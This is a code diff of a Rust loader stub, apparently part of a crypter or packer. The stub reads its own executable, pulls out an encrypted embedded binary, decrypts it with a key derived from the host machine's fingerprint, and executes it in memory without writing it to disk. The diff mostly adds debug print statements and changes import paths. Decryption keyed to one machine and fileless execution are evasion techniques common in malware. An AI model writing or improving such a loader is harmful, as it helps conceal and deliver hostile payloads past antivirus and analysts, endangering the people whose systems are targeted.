@@ -1,30 +1,51 @@
 //! A stub that decrypts and runs the embedded binary in memory.
 extern crate libc;
 
-// Use absolute paths to the modules in the src directory
-use crate::crypto;
-use crate::fingerprint;
-use crate::embed;
+use common::crypto;
+use common::fingerprint;
+use common::embed;
+
+
+// Use absolute 
 use std::process;
 
 #[cfg(unix)]
 use std::os::fd::{FromRawFd, AsRawFd};
 
 fn main() {
-    // 1. Read current executable
-    let exe_data = std::fs::read(std::env::current_exe().unwrap()).unwrap();
+    println!("[*] Stub running...");
 
+    // 1. Read self
+    let exe_path = std::env::current_exe().unwrap();
+    println!("[*] Current exe path: {:?}", exe_path);
+    let exe_data = std::fs::read(&exe_path).expect("Failed to read current executable");
+    println!("[+] ({} bytes)", exe_data.len());
     // 2. Extract encrypted payload
-    let encrypted = embed::extract_from_stub(&exe_data).unwrap();
+    let maybe_encrypted = embed::extract_from_stub(&exe_data);
+    if maybe_encrypted.is_none() {
+        eprintln!("❌ No embedded binary found in stub.");
+        std::process::exit(1);
+    }
+    let encrypted = maybe_encrypted.unwrap();
+    println!("[+] Extracted encrypted payload ({} bytes)", encrypted.len());
 
-    // 3. Decrypt using machine fingerprint
+    // 3. Decrypt using fingerprint
     let fp = fingerprint::generate_fingerprint();
-    let decrypted = crypto::decrypt_binary(&fp, &encrypted).unwrap();
+    println!("[*] Fingerprint used: {}", fp);
 
-    // 4. Execute in memory (no temp files)
+    let maybe_decrypted = crypto::decrypt_binary(&fp, &encrypted);
+    if maybe_decrypted.is_none() {
+        eprintln!("❌ Decryption failed. Possibly wrong fingerprint or corrupted data.");
+        std::process::exit(1);
+    }
+    let decrypted = maybe_decrypted.unwrap();
+    println!("[+] Decryption succeeded. Decrypted binary size: {} bytes", decrypted.len());
+
+    // 4. Execute in memory
+    println!("[*] Attempting to execute decrypted binary in memory...");
     if let Err(e) = run_in_memory(&decrypted) {
-        eprintln!("Failed to run binary: {}", e);
-        process::exit(1);
+        eprintln!("❌ Failed to run binary: {}", e);
+        std::process::exit(1);
     }
 }
 
@@ -49,7 +70,7 @@ fn run_in_memory(binary: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
         libc::execl(
             path_cstr.as_ptr(),
             args_cstr.as_ptr(),
-            std::ptr::null(),
+            std::ptr::null::<std::ffi::c_void>(),
         );
     }
     Err("Failed to execute binary".into())
